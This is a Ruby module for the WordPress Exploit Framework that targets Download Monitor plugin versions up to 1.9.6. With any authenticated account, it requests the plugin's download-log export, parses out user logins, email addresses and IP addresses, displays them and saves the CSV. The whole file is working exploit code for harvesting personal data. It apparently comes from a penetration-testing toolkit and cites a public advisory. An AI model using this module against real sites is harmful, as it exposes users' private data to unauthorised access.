require 'csv'

class Wpxf::Auxiliary::DownloadMonitorLogExport < Wpxf::Module
  include Wpxf

  def initialize
    super

    update_info(
      name: 'Download Monitor <= 1.9.6 Log Export',
      desc: %(
        This module allows a user of any level to export a CSV of the download logs, which
        includes: Download ID, Version ID, Filename, User ID, User Login, User Email, User IP, User Agent, Date, Status
      ),
      author: [
        'James Golovich',                  # Disclosure
        'Rob Carr <rob[at]rastating.com>'  # WPXF module
      ],
      references: [
        ['WPVDB', '8810']
      ],
      date: 'May 05 2017'
    )

    register_options([
      StringOption.new(
        name: 'export_path',
        desc: 'The file to save the export to',
        required: true
      )
    ])
  end

  def check
    check_plugin_version_from_readme('download-monitor', '1.9.7')
  end

  def requires_authentication
    true
  end

  def export_path
    return nil if normalized_option_value('export_path').nil?
    File.expand_path normalized_option_value('export_path')
  end

  def process_row(row)
    return unless row[:user_login] && row[:user_email]
    emit_success "Found user: #{row[:user_login]} (#{row[:user_email]})", true
    @users.push(id: row[:user_login], email: row[:user_email], ip: row[:user_ip])
  end

  def parse_csv(body, delimiter)
    begin
      CSV::Converters[:blank_to_nil] = lambda do |field|
        field && field.empty? ? nil : field
      end
      csv = CSV.new(
        body,
        col_sep: delimiter,
        headers: true,
        header_converters: :symbol,
        converters: [:all, :blank_to_nil]
      )

      csv.to_a.map { |row| process_row(row) }
      return true
    rescue
      return false
    end
  end

  def execute_download_log_export
    res = execute_get_request(
      url: wordpress_url_admin,
      params: { 'dlm_download_logs' => 'true' },
      cookie: session_cookie
    )

    if res.nil?
      emit_error 'No response from the target'
      return false
    end

    if res.code != 200
      emit_error "Server responded with code #{res.code}"
      return false
    end

    res
  end

  def parse_and_display(content)
    @users = [{
      id: 'Username', email: 'E-mail', ip: 'IP Address'
    }]

    unless parse_csv(content, ',') || parse_csv(content, ';')
      emit_error 'Failed to parse response, the CSV was invalid'
      emit_info "CSV content: #{content}", true
      return false
    end

    emit_table @users
  end

  def run
    return false unless super

    emit_info 'Requesting download logs...'
    res = execute_download_log_export

    emit_info 'Parsing response...'
    parse_and_display(res.body)

    emit_info 'Saving export...'
    File.open(export_path, 'w') { |file| file.write(res.body) }
    emit_success "Saved export to #{export_path}"

    true
  end
end
